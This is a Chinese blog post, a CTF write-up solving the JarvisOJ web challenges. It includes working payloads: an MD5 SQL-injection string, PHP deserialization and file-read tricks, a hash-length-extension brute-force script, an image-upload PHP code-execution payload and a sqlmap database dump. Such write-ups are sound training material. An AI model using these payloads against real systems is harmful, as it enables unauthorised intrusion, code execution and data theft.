---
layout:     post                    # 使用的布局（不需要改）
title:      JarvisOJ-WEB-Writeup    # 标题
subtitle:   一只 web 狗在成长        #副标题
date:       2018-09-15              # 时间
author:     RTL                     # 作者
header-img: img/post-bg-hacker.jpg  #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
  - CTF
  - Web
---

# JarvisOJ-WEB-Writeup

## PORT51

- [题目地址](http://web.jarvisoj.com:32770/)

- curl 可以指定使用本地端口来访问 [curl可添加的参数](https://fmhelp.filemaker.com/help/16/fmp/zh/index.html#page/FMP_Help/curl-options.html)
- ![port51](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-PORT51.png?raw=true)

## Localhost

- [题目地址](http://web.jarvisoj.com:32774/)

- 了解一下 request 中的 x-forwarded-for 参数
- ![localhost](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-localhost.png?raw=true)

## Login

- [题目地址](http://web.jarvisoj.com:32772/)

- 随便发了个请求，发现了一个hint
- ![login](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Login.png?raw=true)
- sql注入问题，但是有md5，这该怎么构造呢，一开始想直接闭合括号，但是php不管输入什么字符串，由于没有..连接，都会优先执行md5()，所以网上搜到了一篇[博客](https://blog.csdn.net/greyfreedom/article/details/45846137)

- 学到了 ffifdyop 是个 nb 字符串
- ![loginflag](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-LoginFlag.png?raw=true)

## 神盾局的秘密

- [题目地址](http://web.jarvisoj.com:32768/)

- 打开，加载好慢...
- 抓包，发现图片 src 的 get 参数 ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-1.png?raw=true)
- base64解码 "c2hpZWxkLmpwZw==" -> "shield.jpg"
- 尝试查看 index.php ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-2.png?raw=true)
- 发现了 shield.php 转码后查看 ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-3.png?raw=true)
- 与 index.php 同时查看后使用以下代码构造 payload

```php
<?php
  class Shield {
    public $file = "pctf.php";
  }
  $chybeta = new Shield();
  print_r(serialize($chybeta));
  ?>
```

- 得到 flag ![shield](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-Shield-4.png?raw=true)

## In A Mass

- 习惯性的查看页面源代码 发现源码在 index.phps 里

```php
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
  header('Location: index.php?id=1');
  exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
  echo 'Hahahahahaha';
  return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
  require("flag.txt");
}
else
{
  print "work harder!harder!harder!";
}
?>
```

- 分析一波，id 需要等于0，但是需要直接等于 0 会在第一个 if 出问题，所以使用十六进制 0x0
- a 的话，本想使用 ssrf来访问，但是捣鼓半天发不出请求，所以使用 php 伪协议 a=php://input，将内容写在post里
- b eregi 函数可以使用 %00 中断，而 strlen 不会
- 构造 payload "web.jarvisoj.com:32780?id=0x0&a=php://input&b=%0011111"
- ![inamass](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-InAMass-1.png?raw=true)

- web.jarvisoj.com:32780/^HT2mCpcvOLf  hi666? 猜测是 sql 注入
- 过滤了空格、关键词，但是难住我吗？确实难住了，查了一波资料，构造 payload
- ![inamass](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-InAMass.png?raw=true)

## RE

- 很迷...没想到是 mysql 的函数库
- ![re?](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-RE.png?raw=true)

## flag 在管理员手中

- burp 拦截，发现 ![flaginadmin](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-FlagInAdmin-1.png?raw=true)
- 扫一下目录，发现 index.php~
- 尝试打开失败，linux 下 file 发现是 vim 文件， recover ![flaginadmin](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-FlagInAdmin-2.png?raw=true)

```php
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
  body {
    background:gray;
    text-align:center;
  }
</style>
</head>

<body>
  <?php
  $auth = false;
  $role = "guest";
  $salt =
  if (isset($_COOKIE["role"])) {
    $role = unserialize($_COOKIE["role"]);
    $hsh = $_COOKIE["hsh"];
    if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
      $auth = true;
    } else {
      $auth = false;
    }
  } else {
    $s = serialize($role);
    setcookie('role',$s);
    $hsh = md5($salt.strrev($s));
    setcookie('hsh',$hsh);
  }
  if ($auth) {
    echo "<h3>Welcome Admin. Your flag is";
  } else {
    echo "<h3>Only Admin can see the flag!!</h3>";
  }
?>

</body>
</html>

```

- 这是？[哈希拓展攻击](https://danaive.github.io/2016/12/06/0x01/)...
- salt 长度不知道哇
- 对于密码学我还是懵逼的，网上搜到了脚本
- 安装 hash_extender

```shell
git clone https://github.com/iagox86/hash_extender  
cd hash_extender  
make
```

```py
# -*- coding:utf-8 -*-
from urlparse import urlparse
from httplib import HTTPConnection
from urllib import urlencode
import json
import time
import os
import urllib

def gao(x, y):
      #print x
      #print y
  url = "http://web.jarvisoj.com:32778/index.php"
  cookie = "role=" + x + "; hsh=" + y
      #print cookie
  build_header = {
    'Cookie': cookie,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0',
    'Host': 'web.jarvisoj.com:32778',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  }
  urlparts = urlparse(url)
  conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
  conn.request("GET", urlparts.path, '', build_header)
  resp = conn.getresponse()
  body = resp.read()
  return body

for i in xrange(1000):
  print i
  # secret len = ???
  find_hash = "./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet"
  #print find_hash
  calc_res = os.popen(find_hash).readlines()
  hash_value = calc_res[0][:32]
  attack_padding = calc_res[0][32:]
  attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
  ret = gao(attack_padding, hash_value)
  if "Welcome" in ret:
    print ret
    break
```

## Chopper

- 题目环境配置有问题

## Easy Gallery

- 上传图片完毕后，使用 view 查看，发现了 src ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-1.png?raw=true) ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-2.png?raw=true)

- 那如何可以将其解析为 php 呢？查看 url 发现了问题 ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-3.png?raw=true)
- 猜测可以在图片中加上 php 代码 ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-4.png?raw=true)
- 发现被过滤了？ ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-5.png?raw=true)
- 谷歌寻找了一下方法，构造 payload 

```html
<script language="php">@eval(system('ls'));</script>
```

- 得到 flag ![easygallery](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-EasyGallery-6.png?raw=true)

## Simple Injection

- 直接 sqlmap 跑  

```shell
python sqlmap.py -u http://web.jarvisoj.com:32787/login.php --data="username=admin&password=admin" --tamper=space2comment -D injection --dump
```

- 得到后 md5 解密 334cfb59c9d74849801d5acdcfdaadc3 -> eTAloCrEP
- ![simpleinjection](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-SimpleInjection.png?raw=true)